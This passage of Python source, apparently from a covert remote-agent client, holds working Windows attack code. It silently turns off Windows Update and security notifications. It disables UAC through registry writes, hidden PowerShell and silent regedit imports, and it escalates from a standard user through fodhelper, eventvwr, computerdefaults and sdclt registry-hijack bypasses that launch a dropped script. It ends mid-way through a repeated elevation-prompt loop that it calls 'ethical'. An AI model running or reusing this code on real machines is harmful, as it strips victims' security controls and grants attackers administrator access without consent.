        try:
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsUpdate"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "Enabled", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            log_message("[NOTIFICATIONS] Windows Update notifications disabled")
            success_count += 1
        except Exception as e:
            log_message(f"[NOTIFICATIONS] Failed to disable Windows Update notifications: {e}")
        
        # 7. Disable Security and Maintenance notifications (Current User)
        try:
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "Enabled", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            log_message("[NOTIFICATIONS] Security notifications disabled")
            success_count += 1
        except Exception as e:
            log_message(f"[NOTIFICATIONS] Failed to disable Security notifications: {e}")
        
        log_message(f"[NOTIFICATIONS] Notification disable completed: {success_count}/7 settings applied")
        return success_count > 0
        
    except Exception as e:
        log_message(f"[NOTIFICATIONS] Error disabling notifications: {e}")
        return False

def disable_wsl_routing():
    """AGGRESSIVE: Disable WSL routing for PowerShell/CMD commands."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        log_message("[WSL] Disabling WSL command routing...")
        
        # Method 1: Remove WSL from PATH environment variable
        try:
            current_path = os.environ.get('PATH', '')
            # Remove any WSL-related paths
            new_path = ';'.join([p for p in current_path.split(';') 
                                if 'wsl' not in p.lower() and 'ubuntu' not in p.lower()])
            os.environ['PATH'] = new_path
            log_message("[WSL] Removed WSL from PATH environment")
        except Exception as e:
            log_message(f"[WSL] Failed to modify PATH: {e}")
        
        # Method 2: Disable WSL via registry (requires admin)
        try:
            # Disable WSL feature
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss"
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "DefaultDistribution", 0, winreg.REG_SZ, "")
                winreg.CloseKey(key)
                log_message("[WSL] Disabled WSL default distribution (HKCU)")
            except:
                pass
            
            # Try HKLM (needs admin)
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "DefaultDistribution", 0, winreg.REG_SZ, "")
                winreg.CloseKey(key)
                log_message("[WSL] Disabled WSL default distribution (HKLM)")
            except:
                pass
                
        except Exception as e:
            log_message(f"[WSL] Failed to modify WSL registry: {e}")
        
        # Method 3: Force CMD.exe as default shell (AGGRESSIVE!)
        try:
            # Set ComSpec to force PowerShell
            ps_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
            os.environ['COMSPEC'] = ps_path
            log_message(f"[WSL] Forced COMSPEC to: {ps_path}")
        except Exception as e:
            log_message(f"[WSL] Failed to set COMSPEC: {e}")
        
        # Method 4: Remove powershell.exe alias to WSL (if exists)
        try:
            # Check for WSL aliases in current directory
            ps_alias_path = os.path.join(os.getcwd(), 'powershell.exe')
            if os.path.exists(ps_alias_path) and os.path.islink(ps_alias_path):
                os.remove(ps_alias_path)
                log_message("[WSL] Removed powershell.exe WSL alias")
        except Exception as e:
            log_message(f"[WSL] Failed to remove alias: {e}")
        
        log_message("[ OK ] [WSL] WSL routing disabled successfully!")
        return True
        
    except Exception as e:
        log_message(f"[WSL] Error disabling WSL routing: {e}")
        return False

def verify_uac_status():
    """Verify current UAC status and return detailed info."""
    if not WINDOWS_AVAILABLE:
        return None
    
    try:
        import winreg
        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_READ) as key:
            enable_lua = winreg.QueryValueEx(key, "EnableLUA")[0]
            consent_prompt = winreg.QueryValueEx(key, "ConsentPromptBehaviorAdmin")[0]
            secure_desktop = winreg.QueryValueEx(key, "PromptOnSecureDesktop")[0]
            
        status = {
            'EnableLUA': enable_lua,
            'ConsentPromptBehaviorAdmin': consent_prompt,
            'PromptOnSecureDesktop': secure_desktop,
            'is_disabled': (enable_lua == 0),
            'requires_password': (consent_prompt == 1),
            'is_fully_disabled': (enable_lua == 0 and consent_prompt == 0)
        }
        
        debug_print("=" * 80)
        debug_print("[UAC VERIFY] Current UAC Status:")
        debug_print(f"  EnableLUA: {enable_lua} (0=Disabled, 1=Enabled)")
        debug_print(f"  ConsentPromptBehaviorAdmin: {consent_prompt}")
        debug_print(f"    0 = No prompts (DISABLED)")
        debug_print(f"    1 = Password required (STRICT)")
        debug_print(f"    5 = Just click Yes (CONSENT)")
        debug_print(f"  PromptOnSecureDesktop: {secure_desktop} (0=Off, 1=On)")
        
        if status['is_fully_disabled']:
            debug_print("  [ OK ] STATUS: UAC FULLY DISABLED - No admin password popups!")
        elif enable_lua == 0:
            debug_print("  [WARN] STATUS: UAC Disabled but ConsentPromptBehaviorAdmin not 0")
        elif consent_prompt == 1:
            debug_print("  [FAIL] STATUS: STRICT MODE - Password required for all admin actions")
        else:
            debug_print(f"  [-] STATUS: Custom mode (ConsentPromptBehaviorAdmin={consent_prompt})")
        debug_print("=" * 80)
        
        return status
    except Exception as e:
        debug_print(f"[UAC VERIFY] Error checking UAC status: {e}")
        return None

def silent_disable_uac_method1():
    """Method 1: Direct registry modification (Python winreg)."""
    debug_print("[UAC DISABLE] Method 1: Direct registry modification...")
    try:
        import winreg
        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
        
        debug_print("[ OK ] [UAC DISABLE] Method 1 SUCCESS!")
        return True
    except Exception as e:
        debug_print(f"[ X ] [UAC DISABLE] Method 1 FAILED: {e}")
        return False

def silent_disable_uac_method2():
    """Method 2: reg.exe command (silent)."""
    debug_print("[UAC DISABLE] Method 2: reg.exe command...")
    try:
        import subprocess
        
        commands = [
            ['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
             '/v', 'EnableLUA', '/t', 'REG_DWORD', '/d', '0', '/f'],
            ['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
             '/v', 'ConsentPromptBehaviorAdmin', '/t', 'REG_DWORD', '/d', '0', '/f'],
            ['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
             '/v', 'PromptOnSecureDesktop', '/t', 'REG_DWORD', '/d', '0', '/f']
        ]
        
        for cmd in commands:
            subprocess.run(cmd, 
                         creationflags=subprocess.CREATE_NO_WINDOW,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
                         timeout=10)
        
        debug_print("[ OK ] [UAC DISABLE] Method 2 SUCCESS!")
        return True
    except Exception as e:
        debug_print(f"[ X ] [UAC DISABLE] Method 2 FAILED: {e}")
        return False

def silent_disable_uac_method3():
    """Method 3: PowerShell Set-ItemProperty (silent)."""
    debug_print("[UAC DISABLE] Method 3: PowerShell...")
    try:
        import subprocess
        
        ps_commands = [
            "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'EnableLUA' -Value 0 -ErrorAction SilentlyContinue",
            "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0 -ErrorAction SilentlyContinue",
            "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'PromptOnSecureDesktop' -Value 0 -ErrorAction SilentlyContinue"
        ]
        
        for cmd in ps_commands:
            subprocess.run([
                'powershell.exe', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', 
                '-Command', cmd
            ],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=15)
        
        debug_print("[ OK ] [UAC DISABLE] Method 3 SUCCESS!")
        return True
    except Exception as e:
        debug_print(f"[ X ] [UAC DISABLE] Method 3 FAILED: {e}")
        return False

def silent_disable_uac_method4():
    """Method 4: Registry file import (no file creation - inline)."""
    debug_print("[UAC DISABLE] Method 4: Registry import...")
    try:
        import subprocess
        import tempfile
        import os
        
        reg_content = '''Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]
"EnableLUA"=dword:00000000
"ConsentPromptBehaviorAdmin"=dword:00000000
"PromptOnSecureDesktop"=dword:00000000
'''
        
        # Create temporary reg file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.reg', delete=False) as f:
            reg_file = f.name
            f.write(reg_content)
        
        # Import silently
        subprocess.run(['regedit.exe', '/s', reg_file],
                      creationflags=subprocess.CREATE_NO_WINDOW,
                      stdout=subprocess.DEVNULL,
                      stderr=subprocess.DEVNULL,
                      timeout=10)
        
        # Delete temp file
        try:
            os.remove(reg_file)
        except:
            pass
        
        debug_print("[ OK ] [UAC DISABLE] Method 4 SUCCESS!")
        return True
    except Exception as e:
        debug_print(f"[ X ] [UAC DISABLE] Method 4 FAILED: {e}")
        return False

def bootstrap_uac_disable_no_admin():
    """
    BOOTSTRAP METHOD: Disable UAC WITHOUT needing admin privileges!
    
    Strategy:
    1. Use UAC bypass techniques (fodhelper, eventvwr, etc.) to gain admin
    2. The elevated process then disables UAC permanently
    3. All happens automatically with ZERO password prompts!
    
    This works from a STANDARD USER account!
    """
    if not WINDOWS_AVAILABLE:
        debug_print("[BOOTSTRAP] Not Windows - skipping")
        return False
    
    debug_print("=" * 80)
    debug_print("[BOOTSTRAP] UAC DISABLE WITHOUT ADMIN PRIVILEGES!")
    debug_print("[BOOTSTRAP] Using UAC bypass to gain admin, then disable UAC")
    debug_print("=" * 80)
    
    # Check if already admin
    if is_admin():
        debug_print("[BOOTSTRAP] Already admin - proceeding directly to UAC disable")
        return silent_disable_uac()
    
    # Not admin - use UAC bypass to elevate
    debug_print("[BOOTSTRAP] Not admin - using UAC bypass methods to elevate...")
    debug_print("[BOOTSTRAP] This works WITHOUT password from standard user account!")
    
    # Create a script that will run elevated and disable UAC
    disable_uac_script = f'''
import sys
import os

# Add parent directory to path to import from client.py
sys.path.insert(0, r"{os.path.dirname(os.path.abspath(__file__))}")

# Set environment flag to indicate we're in elevated mode
os.environ['ELEVATED_MODE'] = '1'

try:
    # Import and run UAC disable
    import client
    result = client.silent_disable_uac()
    
    if result:
        print("\\n[ELEVATED] UAC disabled successfully!")
        print("[ELEVATED] Restart required for changes to take effect")
    else:
        print("\\n[ELEVATED] UAC disable failed")
    
    # Exit elevated process
    sys.exit(0 if result else 1)
except Exception as e:
    print(f"[ELEVATED] Error: {{e}}")
    import traceback
    traceback.print_exc()
    sys.exit(1)
'''
    
    # Save script to temp location
    import tempfile
    script_path = os.path.join(tempfile.gettempdir(), "uac_disable_elevated.py")
    
    try:
        with open(script_path, 'w') as f:
            f.write(disable_uac_script)
        debug_print(f"[BOOTSTRAP] Created elevation script: {script_path}")
    except Exception as e:
        debug_print(f"[BOOTSTRAP] Failed to create script: {e}")
        return False
    
    # Try UAC bypass methods to run the script elevated
    debug_print("\n[BOOTSTRAP] Attempting UAC bypass methods...")
    
    # Use the UAC Manager to try all bypass methods
    try:
        manager = get_uac_manager()
        debug_print(f"[BOOTSTRAP] UAC Manager loaded with {len(manager.methods)} methods")
        
        # Temporarily modify the executable path to run our script
        original_file = __file__
        
        # Try each bypass method with our elevation script
        for method_name in manager.get_available_methods():
            try:
                debug_print(f"\n[BOOTSTRAP] Trying UAC bypass: {method_name}")
                method = manager.methods[method_name]
                
                # Get the method's executable command
                elevated_cmd = f'python.exe "{script_path}"'
                
                # Execute the bypass with our script
                if method_name == 'fodhelper':
                    result = bootstrap_fodhelper_bypass(elevated_cmd)
                elif method_name == 'eventvwr':
                    result = bootstrap_eventvwr_bypass(elevated_cmd)
                elif method_name == 'computerdefaults':
                    result = bootstrap_computerdefaults_bypass(elevated_cmd)
                elif method_name == 'sdclt':
                    result = bootstrap_sdclt_bypass(elevated_cmd)
                else:
                    continue
                
                if result:
                    debug_print(f"[BOOTSTRAP] [ OK ] UAC bypass '{method_name}' succeeded!")
                    debug_print("[BOOTSTRAP] Elevated process should now be disabling UAC...")
                    time.sleep(5)  # Wait for elevated process
                    
                    # Check if UAC was disabled
                    status = verify_uac_status()
                    if status and status['is_fully_disabled']:
                        debug_print("=" * 80)
                        debug_print("[ OK ][ OK ][ OK ] [BOOTSTRAP] SUCCESS!")
                        debug_print("[ OK ] UAC disabled WITHOUT needing admin password!")
                        debug_print("[ OK ] All done from standard user account!")
                        debug_print("=" * 80)
                        
                        # Cleanup
                        try:
                            os.remove(script_path)
                        except:
                            pass
                        
                        return True
                
            except Exception as e:
                debug_print(f"[BOOTSTRAP] Method '{method_name}' failed: {e}")
                continue
        
        debug_print("[BOOTSTRAP] All UAC bypass methods failed")
        
    except Exception as e:
        debug_print(f"[BOOTSTRAP] UAC Manager error: {e}")
    
    # Cleanup
    try:
        os.remove(script_path)
    except:
        pass
    
    debug_print("=" * 80)
    debug_print("[ X ] [BOOTSTRAP] Could not gain admin via UAC bypass")
    debug_print("[ X ] Falling back to standard UAC disable (requires admin)")
    debug_print("=" * 80)
    
    # Fallback to regular method
    return silent_disable_uac()

def bootstrap_fodhelper_bypass(command):
    """Bootstrap UAC bypass using fodhelper.exe"""
    try:
        import winreg
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        
        # Execute fodhelper
        fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
        subprocess.Popen([fodhelper_path],
                        creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(3)
        
        # Cleanup
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except:
            pass
        
        return True
    except Exception as e:
        debug_print(f"[BOOTSTRAP] Fodhelper bypass error: {e}")
        return False

def bootstrap_eventvwr_bypass(command):
    """Bootstrap UAC bypass using eventvwr.exe"""
    try:
        import winreg
        key_path = r"Software\Classes\mscfile\shell\open\command"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
        
        # Execute eventvwr
        eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
        subprocess.Popen([eventvwr_path],
                        creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(3)
        
        # Cleanup
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except:
            pass
        
        return True
    except Exception as e:
        debug_print(f"[BOOTSTRAP] EventVwr bypass error: {e}")
        return False

def bootstrap_computerdefaults_bypass(command):
    """Bootstrap UAC bypass using computerdefaults.exe"""
    try:
        import winreg
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        
        # Execute computerdefaults
        computerdefaults_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'ComputerDefaults.exe')
        subprocess.Popen([computerdefaults_path],
                        creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(3)
        
        # Cleanup
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except:
            pass
        
        return True
    except Exception as e:
        debug_print(f"[BOOTSTRAP] ComputerDefaults bypass error: {e}")
        return False

def bootstrap_sdclt_bypass(command):
    """Bootstrap UAC bypass using sdclt.exe"""
    try:
        import winreg
        key_path = r"Software\Classes\Folder\shell\open\command"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        
        # Execute sdclt
        sdclt_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'sdclt.exe')
        subprocess.Popen([sdclt_path],
                        creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(3)
        
        # Cleanup
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except:
            pass
        
        return True
    except Exception as e:
        debug_print(f"[BOOTSTRAP] Sdclt bypass error: {e}")
        return False

def silent_disable_uac():
    """
    Silently disable UAC with ZERO popups - tries all methods until success.
    This COMPLETELY removes admin password requirement for ALL exe/installers!
    """
    if not WINDOWS_AVAILABLE:
        debug_print("[UAC DISABLE] Not Windows - skipping")
        return False
    
    debug_print("=" * 80)
    debug_print("[UAC DISABLE] STARTING SILENT UAC DISABLE")
    debug_print("[UAC DISABLE] This will DISABLE admin password popups for ALL applications!")
    debug_print("=" * 80)
    
    # Check current status first
    initial_status = verify_uac_status()
    if initial_status and initial_status['is_fully_disabled']:
        debug_print("[UAC DISABLE] [ OK ] UAC already fully disabled - no action needed!")
        return True
    
    # Try all methods in sequence
    methods = [
        silent_disable_uac_method1,
        silent_disable_uac_method2,
        silent_disable_uac_method3,
        silent_disable_uac_method4
    ]
    
    success = False
    for i, method in enumerate(methods, 1):
        debug_print(f"\n[UAC DISABLE] Trying method {i}/{len(methods)}...")
        try:
            if method():
                success = True
                debug_print(f"[UAC DISABLE] Method {i} succeeded! Verifying...")
                break
        except Exception as e:
            debug_print(f"[UAC DISABLE] Method {i} exception: {e}")
            continue
    
    # Verify final status
    debug_print("\n[UAC DISABLE] Verifying final status...")
    final_status = verify_uac_status()
    
    if final_status and final_status['is_fully_disabled']:
        debug_print("=" * 80)
        debug_print("[ OK ][ OK ][ OK ] [UAC DISABLE] SUCCESS!")
        debug_print("[ OK ] Admin password popups are NOW DISABLED for ALL applications!")
        debug_print("[ OK ] All .exe and installers will run without password prompts!")
        debug_print("[ OK ] RESTART REQUIRED for changes to take full effect!")
        debug_print("=" * 80)
        try:
            emit_security_notification('success', 'UAC Disabled', 'Admin prompts disabled for applications')
        except Exception:
            pass
        return True
    else:
        debug_print("=" * 80)
        debug_print("[ X ][ X ][ X ] [UAC DISABLE] FAILED!")
        debug_print("[ X ] Could not disable UAC with any method")
        debug_print("[ X ] May need administrator privileges")
        debug_print("=" * 80)
        try:
            emit_security_notification('error', 'UAC Disable Failed', 'Could not disable UAC')
        except Exception:
            pass
        return False

def silent_enable_strict_uac():
    """
    Silently enable STRICT UAC - requires admin password for ALL exe/installers.
    This makes Windows ask for password on EVERY admin action!
    """
    if not WINDOWS_AVAILABLE:
        debug_print("[UAC ENABLE] Not Windows - skipping")
        return False
    
    debug_print("=" * 80)
    debug_print("[UAC ENABLE] STARTING STRICT UAC ENABLE")
    debug_print("[UAC ENABLE] This will REQUIRE admin password for ALL applications!")
    debug_print("=" * 80)
    
    # Check current status
    initial_status = verify_uac_status()
    if initial_status and initial_status['requires_password']:
        debug_print("[UAC ENABLE] [ OK ] UAC already in strict mode - no action needed!")
        return True
    
    # Try multiple methods
    success = False
    
    # Method 1: Direct registry
    debug_print("[UAC ENABLE] Method 1: Direct registry modification...")
    try:
        import winreg
        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 1)
        
        debug_print("[ OK ] [UAC ENABLE] Method 1 SUCCESS!")
        success = True
    except Exception as e:
        debug_print(f"[ X ] [UAC ENABLE] Method 1 FAILED: {e}")
        
        # Method 2: PowerShell fallback
        debug_print("[UAC ENABLE] Method 2: PowerShell fallback...")
        try:
            import subprocess
            ps_cmd = """
            Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'EnableLUA' -Value 1 -ErrorAction SilentlyContinue
            Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'ConsentPromptBehaviorAdmin' -Value 1 -ErrorAction SilentlyContinue
            Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'PromptOnSecureDesktop' -Value 1 -ErrorAction SilentlyContinue
            """
            subprocess.run(['powershell.exe', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
                         creationflags=subprocess.CREATE_NO_WINDOW,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
                         timeout=15)
            debug_print("[ OK ] [UAC ENABLE] Method 2 SUCCESS!")
            success = True
        except Exception as e2:
            debug_print(f"[ X ] [UAC ENABLE] Method 2 FAILED: {e2}")
    
    # Verify final status
    debug_print("\n[UAC ENABLE] Verifying final status...")
    final_status = verify_uac_status()
    
    if final_status and final_status['requires_password']:
        debug_print("=" * 80)
        debug_print("[ OK ][ OK ][ OK ] [UAC ENABLE] SUCCESS!")
        debug_print("[ OK ] Admin password is NOW REQUIRED for ALL applications!")
        debug_print("[ OK ] All .exe and installers will ask for password!")
        debug_print("[ OK ] RESTART REQUIRED for changes to take full effect!")
        debug_print("=" * 80)
        return True
    else:
        debug_print("=" * 80)
        debug_print("[ X ][ X ][ X ] [UAC ENABLE] FAILED!")
        debug_print("[ X ] Could not enable strict UAC")
        debug_print("=" * 80)
        return False

def disable_uac():
    """Disable UAC (User Account Control) by modifying registry settings."""
    # Try bootstrap method first (works without admin!)
    if not is_admin():
        debug_print("[UAC] Not admin - using bootstrap method (no password needed)")
        return bootstrap_uac_disable_no_admin()
    else:
        debug_print("[UAC] Already admin - using direct method")
        return silent_disable_uac()

def toggle_uac(enable=False):
    """
    Toggle UAC on or off with full debugging.
    
    Args:
        enable: True to ENABLE strict UAC (password required)
                False to DISABLE UAC (no password required)
    """
    if not WINDOWS_AVAILABLE:
        print("Not Windows - UAC toggle not available")
        return False
    
    print("\n" + "=" * 80)
    if enable:
        print("ENABLING STRICT UAC (Password will be required for all admin actions)")
    else:
        print("DISABLING UAC (No password required for admin actions)")
    print("=" * 80)
    
    # Show current status
    print("\nCURRENT STATUS:")
    verify_uac_status()
    
    # Execute change
    print("\nAPPLYING CHANGES...")
    if enable:
        result = silent_enable_strict_uac()
    else:
        result = silent_disable_uac()
    
    # Show final status
    print("\nFINAL STATUS:")
    verify_uac_status()
    
    if result:
        print("\n" + "=" * 80)
        print("[ OK ] SUCCESS! Changes applied successfully!")
        print("[ ! ] RESTART REQUIRED for changes to take full effect!")
        print("=" * 80)
    else:
        print("\n" + "=" * 80)
        print("[ X ] FAILED! Could not apply changes")
        print("Make sure you're running as Administrator")
        print("=" * 80)
    
    return result

def test_uac_control():
    """Test UAC control functions interactively."""
    if not WINDOWS_AVAILABLE:
        print("Not Windows - UAC control not available")
        return
    
    print("\n" + "=" * 80)
    print("UAC CONTROL TEST - INTERACTIVE MODE")
    print("=" * 80)
    
    # Show current status
    print("\nCURRENT UAC STATUS:")
    status = verify_uac_status()
    
    if not status:
        print("[ X ] Could not read UAC status - may need admin privileges")
        return
    
    print("\n\nOPTIONS:")
    print("1. DISABLE UAC (no password required for any exe/installer)")
    print("2. ENABLE STRICT UAC (password required for all exe/installers)")
    print("3. Check status only")
    print("4. Exit")
    
    choice = input("\nEnter choice (1-4): ").strip()
    
    if choice == "1":
        print("\n[UNLOCK] DISABLING UAC - No more password prompts!")
        toggle_uac(enable=False)
    elif choice == "2":
        print("\n[LOCK] ENABLING STRICT UAC - Password will be required!")
        toggle_uac(enable=True)
    elif choice == "3":
        print("\n[DATA] Current status shown above")
    else:
        print("\nExiting...")
    
    print("\nTest complete!")

def run_as_admin():
    """Relaunch the script with elevated privileges if not already admin."""
    if not WINDOWS_AVAILABLE:
        return False
    
    if not is_admin():
        log_message("[!] Relaunching as Administrator...")
        try:
            # Relaunch with elevated privileges
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{__file__}"', None, 1
            )
            # ShellExecuteW returns > 32 on success
            if result > 32:
                if KEEP_ORIGINAL_PROCESS:
                    log_message("[!] Elevated instance launched - keeping original process running")
                    return True
                else:
                    log_message("[!] Elevated instance launched successfully - original instance will exit")
                    time.sleep(2)  # Give elevated instance time to start
                    sys.exit(0)
            else:
                log_message(f"[!] User declined elevation or launch failed (code: {result})")
                return False
        except (AttributeError, OSError):
            log_message("[!] Failed to relaunch as admin: Windows API not available")
            return False
        except Exception as e:
            log_message(f"[!] Failed to relaunch as admin: {e}")
            return False
    return True

def _e2e_decrypt(agent_id, enc, secret_env='AGENT_SHARED_SECRET'):
    try:
        import base64, os
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        from cryptography.fernet import Fernet
        secret = os.environ.get(secret_env, '')
        if not secret or not isinstance(enc, str):
            return enc
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=str(agent_id).encode(), iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(secret.encode()))
        return Fernet(key).decrypt(enc.encode()).decode()
    except Exception:
        return enc

class FileIntegrityMonitor:
    def __init__(self, paths_to_monitor):
        self.paths = [p for p in (paths_to_monitor or []) if isinstance(p, str)]
        self.hashes = {}
        self.initialize_hashes()
    def initialize_hashes(self):
        import hashlib, os
        for path in self.paths:
            if os.path.exists(path):
                self.hashes[path] = self.calculate_hash(path)
    def calculate_hash(self, filepath):
        import hashlib, os
        if os.path.isdir(filepath):
            h = hashlib.sha256()
            try:
                for root, _, files in os.walk(filepath):
                    for f in files:
                        fp = os.path.join(root, f)
                        try:
                            with open(fp, 'rb') as fh:
                                for block in iter(lambda: fh.read(4096), b''):
                                    h.update(block)
                        except Exception:
                            continue
                return h.hexdigest()
            except Exception:
                return ''
        sha256 = hashlib.sha256()
        try:
            with open(filepath, 'rb') as f:
                for block in iter(lambda: f.read(4096), b''):
                    sha256.update(block)
            return sha256.hexdigest()
        except Exception:
            return ''
    def check_integrity(self):
        import os
        changes = []
        for path, original_hash in list(self.hashes.items()):
            if not os.path.exists(path):
                changes.append({'path': path, 'status': 'deleted'})
                continue
            current_hash = self.calculate_hash(path)
            if current_hash and current_hash != original_hash:
                changes.append({'path': path, 'status': 'modified'})
                self.hashes[path] = current_hash
        return changes

def run_as_admin_with_limited_attempts():
    """
    [ OK ] ETHICAL VERSION: Request admin privileges with LIMITED attempts.
    Shows UAC prompt up to MAX_PROMPT_ATTEMPTS times (default: 3).
    Respects user's decision if they decline.
    """
    if not WINDOWS_AVAILABLE:
        debug_print("[ADMIN] Not Windows - skipping admin request")
        return False
    
    max_attempts = MAX_PROMPT_ATTEMPTS if 'MAX_PROMPT_ATTEMPTS' in globals() else 3
    
    debug_print("=" * 80)
    debug_print(f"[ OK ] [ETHICAL ADMIN REQUEST] Requesting admin permission")
    debug_print(f"[ OK ] [ETHICAL ADMIN REQUEST] Will ask up to {max_attempts} times")
    debug_print(f"[ OK ] [ETHICAL ADMIN REQUEST] Your choice will be respected")
    debug_print("=" * 80)
    
    attempt = 0
    
    while attempt < max_attempts:
        attempt += 1
        
        # Check if already admin
        if is_admin():
            debug_print("=" * 80)
            debug_print(f"[ OK ] [ADMIN] Admin privileges GRANTED! (after {attempt} attempts)")
            debug_print("=" * 80)
            return True
        
        debug_print(f"[ADMIN] Attempt {attempt}/{max_attempts}: Requesting admin privileges...")
        log_message(f"[INFO] Requesting admin privileges (attempt {attempt}/{max_attempts})...")
        
        try:
            # Show UAC prompt
            result = ctypes.windll.shell32.ShellExecuteW(
                None,
                "runas",  # Request elevation
                sys.executable,  # Python executable
                f'"{__file__}"',  # This script
                None,
                1  # SW_SHOWNORMAL
            )
            
            # ShellExecuteW returns > 32 on success
            if result > 32:
                debug_print("=" * 80)
                debug_print("[ OK ] [ADMIN] User clicked YES - Elevated instance starting")
                debug_print("=" * 80)
                log_message("[ OK ] User granted admin privileges!")
                
                # Exit original instance to prevent duplicates
                debug_print("[ OK ] [ADMIN] Original instance will exit to prevent duplicates")
                time.sleep(1)
                sys.exit(0)
            else:
                # User clicked NO or Cancel
                debug_print(f"[ X ] [ADMIN] Attempt {attempt}/{max_attempts}: User clicked NO or Cancel (result: {result})")
                
                if attempt < max_attempts:
                    debug_print(f"[ADMIN] Waiting 3 seconds before next attempt...")
